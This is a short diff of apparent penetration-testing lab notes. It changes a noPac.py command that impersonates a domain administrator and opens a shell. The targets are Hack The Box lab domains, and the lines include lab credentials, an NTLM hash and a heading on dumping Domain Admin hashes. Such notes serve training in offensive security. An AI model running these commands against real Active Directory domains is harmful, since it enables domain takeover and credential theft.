@@ -18,7 +18,7 @@ python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-l
 ```
 Shell
 ```bash
-python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+python3 noPac.py outdated.htb/sflowers -hashes 1FCDB1F6015DCB318CC77BB2BDA14DB5 -dc-ip 172.16.5.5  -dc-host DC.outdated.htb --shell --impersonate administrator -use-ldap
 ```
 Dump NTLM hash of `Domain Admin`
 ```bash
